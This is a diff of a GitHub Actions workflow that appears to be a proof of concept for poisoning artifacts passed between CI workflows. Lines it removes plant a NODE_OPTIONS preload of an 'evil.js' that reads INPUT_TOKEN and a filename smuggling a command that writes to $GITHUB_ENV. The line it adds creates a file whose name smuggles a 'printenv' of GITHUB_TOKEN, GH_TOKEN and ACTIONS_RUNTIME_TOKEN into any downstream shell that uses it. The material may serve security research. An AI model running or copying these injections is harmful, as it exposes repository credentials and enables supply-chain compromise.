@@ -12,20 +12,10 @@ jobs:
           mkdir -p /tmp/content
           echo "${{ github.event.pull_request.number }}" > /tmp/content/pr_number.txt
           echo "report from forged Test workflow" > /tmp/content/report.txt
-          printf 'NODE_OPTIONS=--require /tmp/content/contentdefault/evil.js\n' > /tmp/content/env.txt
-          cat > /tmp/content/evil.js <<'JS'
-          const fs = require('fs');
-          try {
-            const t = process.env.INPUT_TOKEN || '';
-            const line = 'LEAK len=' + t.length + ' prefix=' + t.slice(0,4) + ' action=' + (process.env.GITHUB_ACTION || '');
-            fs.appendFileSync('/tmp/content/leak.txt', line + '\n');
-            console.log(line);
-          } catch (e) { console.log('LEAKERR ' + e.message); }
-          JS
           python3 - <<'PY'
-          open('/tmp/content/$(cp /tmp/content/contentdefault/env.txt $GITHUB_ENV)report.txt','w').write('x')
+          open('/tmp/content/report.txt;printenv GITHUB_TOKEN GH_TOKEN INPUT_TOKEN ACTIONS_RUNTIME_TOKEN;true;#.txt','w').write('x')
           PY
-          ls -la /tmp/content | sed -n '1,12p'
+          ls -1 /tmp/content
       - name: upload artifact
         uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
